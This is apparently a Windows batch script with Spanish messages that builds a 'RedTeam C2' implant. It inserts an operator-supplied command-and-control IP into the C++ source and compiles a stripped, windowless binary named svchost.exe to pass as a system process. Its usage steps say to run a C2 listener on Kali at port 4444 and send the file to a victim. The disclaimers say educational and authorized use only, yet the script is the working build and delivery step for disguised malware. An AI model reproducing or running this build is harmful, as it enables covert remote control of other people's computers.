@echo off
title RedTeam C2 - Compilador
color 0a

echo ========================================
echo    RedTeam C2 Implant - Compilador
echo    SOLO USO EDUCATIVO/AUTORIZADO
echo ========================================
echo.

REM Configurar IP del servidor C2
set /p C2_IP="Ingresa IP del servidor C2 (Kali): "
set C2_PORT=4444

echo.
echo [*] Configurando implant...
powershell -Command "(Get-Content implant.cpp) -replace '127.0.0.1', '%C2_IP%' | Set-Content implant_ready.cpp"

echo [*] Compilando implant para Windows 11 x64...
echo.

REM Usar MinGW-w64 para compilar
x86_64-w64-mingw32-g++ implant_ready.cpp -o ..\output\svchost.exe ^
    -s ^
    -O2 ^
    -mwindows ^
    -lws2_32 ^
    -liphlpapi ^
    -ladvapi32 ^
    -lshlwapi ^
    -static ^
    -static-libgcc ^
    -static-libstdc++ ^
    -fno-exceptions ^
    -fno-rtti ^
    -fno-stack-protector ^
    -zexecstack ^
    -Wall ^
    -Wextra ^
    -Wl,--strip-all ^
    -Wl,--disable-stdcall-fixup ^
    -D_WIN32_WINNT=0x0601

if %errorlevel% equ 0 (
    echo.
    echo [✔] Compilacion exitosa!
    echo [*] Output: ..\output\svchost.exe
    
    REM Generar hash del payload
    certutil -hashfile ..\output\svchost.exe SHA256 > ..\output\hash.txt
    
    echo.
    echo [*] SHA256 generado en output\hash.txt
    echo [*] Tamaño: 
    dir ..\output\svchost.exe
    
    REM Limpiar archivos temporales
    del implant_ready.cpp
    
    echo.
    echo ========================================
    echo    INSTRUCCIONES DE USO:
    echo ========================================
    echo 1. Ejecutar servidor en Kali: 
    echo    python3 ../server/c2_server.py 4444
    echo.
    echo 2. Enviar svchost.exe a victima (ENTORNO AUTORIZADO)
    echo 3. Esperar conexion en el C2
    echo.
    echo [!!!] USO EXCLUSIVAMENTE EDUCATIVO
    echo [!!!] REQUIERE AUTORIZACION ESCRITA
    echo.
) else (
    echo.
    echo [X] Error de compilacion!
    echo [*] Asegurate de tener MinGW-w64 instalado
    echo [*] Instalar con: sudo apt install mingw-w64
)

pause
